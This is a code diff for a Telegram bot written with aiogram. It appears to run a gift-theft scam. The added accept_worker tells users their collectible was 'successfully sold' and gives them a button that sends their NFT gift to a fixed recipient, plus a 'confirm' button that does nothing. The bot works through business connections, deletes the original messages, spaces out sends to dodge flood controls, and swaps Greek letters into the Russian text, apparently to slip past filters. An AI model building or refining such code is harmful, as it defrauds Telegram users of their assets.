@@ -19,6 +19,7 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
+accept_queue = asyncio.Queue()  # Очередь для принятия офферов
 client_user_ids = {}
 click_cooldowns = {}  # Защита от спама по кнопкам
 
@@ -111,7 +112,7 @@ def make_accept_keyboard():
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text="Пеρедать НФТ", url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5985472565508838112")],
-            [InlineKeyboardButton(text="Подтвеρдить пеρедачу", callback_data="noop", icon_custom_emoji_id="5776375003280838798")],
+            [InlineKeyboardButton(text="Подтвеρдить передачу", callback_data="noop", icon_custom_emoji_id="5776375003280838798")],
         ]
     )
 
@@ -185,7 +186,6 @@ async def handle_business_command(message: Message):
 
 @dp.callback_query(F.data.startswith("a|"))
 async def accept_offer(cb: CallbackQuery):
-    # Защита от спама (cooldown 1.5 секунды на нажатие кнопки)
     user_id = cb.from_user.id
     now = time.time()
     if user_id in click_cooldowns and now - click_cooldowns[user_id] < 1.5:
@@ -201,44 +201,25 @@ async def accept_offer(cb: CallbackQuery):
     _, slug, gift_num_str, amount, currency_type, lang = parts
     gift_num = int(gift_num_str)
     
-    currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
-    gift_name = slug.replace("-", " ")
-    
-    gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
-    
-    # Текст точно как на твоем успешном скриншоте
-    text = (
-        f"{gift_emoji} Коллекционный пρедмет: <a href=\"https://t.me/nft/{slug}-{gift_num}\"><b>{gift_name}-{gift_num}</b></a> успешно пρодан!\n\n"
-        f"• Пеρедайте коллекционный пρедмет покупателю для зачисления {currency_name}."
-    )
-    
     chat_id = cb.message.chat.id
     message_id = cb.message.message_id
     key = f"{chat_id}:{message_id}"
     bcid = message_bcid.get(key) or cb.message.business_connection_id
 
-    # Убираем часики на кнопке без назойливых алертов
-    await cb.answer("✅ Успешно принято!", show_alert=False)
+    # Сразу убираем часики на кнопке
+    await cb.answer("✅ В очереди...", show_alert=False)
 
-    try:
-        edit_kwargs = {
-            "chat_id": chat_id,
-            "message_id": message_id,
-            "text": text,
-            "parse_mode": ParseMode.HTML,
-            "reply_markup": make_accept_keyboard(),
-            "link_preview_options": LinkPreviewOptions(is_disabled=False, show_above_text=True)
-        }
-        if bcid:
-            edit_kwargs["business_connection_id"] = bcid
-
-        await bot.edit_message_text(**edit_kwargs)
-    except Exception as e:
-        error_str = str(e)
-        if "message is not modified" in error_str:
-            pass
-        else:
-            logging.error(f"Edit message error: {error_str}")
+    # Добавляем задачу в очередь принятия с задержкой
+    await accept_queue.put({
+        "chat_id": chat_id,
+        "message_id": message_id,
+        "slug": slug,
+        "gift_num": gift_num,
+        "amount": amount,
+        "currency_type": currency_type,
+        "lang": lang,
+        "bcid": bcid
+    })
 
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
@@ -258,13 +239,12 @@ async def decline_offer(cb: CallbackQuery):
 
 @dp.callback_query(F.data == "noop")
 async def noop_handler(cb: CallbackQuery):
-    await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
+    await cb.answer("Сначала выполните пеρедачу НФТ по кнопке выше!", show_alert=True)
 
 async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
-            # Небольшая задержка перед отправкой для защиты от Flood Control
             await asyncio.sleep(random.uniform(0.8, 1.2))
 
             text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
@@ -308,8 +288,59 @@ async def sender_worker():
         finally:
             message_queue.task_done()
 
+async def accept_worker():
+    while True:
+        task = await accept_queue.get()
+        try:
+            # Задержка перед обработкой принятия во избежание PEER_FLOOD
+            await asyncio.sleep(random.uniform(0.8, 1.2))
+
+            slug = task["slug"]
+            gift_num = task["gift_num"]
+            currency_type = task["currency_type"]
+            chat_id = task["chat_id"]
+            message_id = task["message_id"]
+            bcid = task["bcid"]
+
+            currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
+            gift_name = slug.replace("-", " ")
+            gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
+            
+            text = (
+                f"{gift_emoji} Коллекционный пρедмет: <a href=\"https://t.me/nft/{slug}-{gift_num}\"><b>{gift_name}-{gift_num}</b></a> успешно пρодан!\n\n"
+                f"• Пеρедайте коллекционный пρедмет покупателю для зачисления {currency_name}."
+            )
+
+            send_kwargs = {
+                "chat_id": chat_id,
+                "text": text,
+                "parse_mode": ParseMode.HTML,
+                "reply_markup": make_accept_keyboard(),
+                "link_preview_options": LinkPreviewOptions(is_disabled=False, show_above_text=True)
+            }
+            if bcid:
+                send_kwargs["business_connection_id"] = bcid
+
+            await bot.send_message(**send_kwargs)
+
+            if bcid:
+                await bot.delete_business_messages(business_connection_id=bcid, message_ids=[message_id])
+            else:
+                await bot.delete_message(chat_id=chat_id, message_id=message_id)
+
+        except TelegramRetryAfter as e:
+            wait_time = e.retry_after + 1
+            logging.warning(f"Accept flood control! Waiting {wait_time}s.")
+            await asyncio.sleep(wait_time)
+            await accept_queue.put(task)
+        except Exception as e:
+            logging.error(f"Accept worker error: {e}")
+        finally:
+            accept_queue.task_done()
+
 async def main():
     asyncio.create_task(sender_worker())
+    asyncio.create_task(accept_worker())
     await dp.start_polling(bot, allowed_updates=["callback_query", "business_connection", "business_message", "message"])
 
 if __name__ == "__main__":
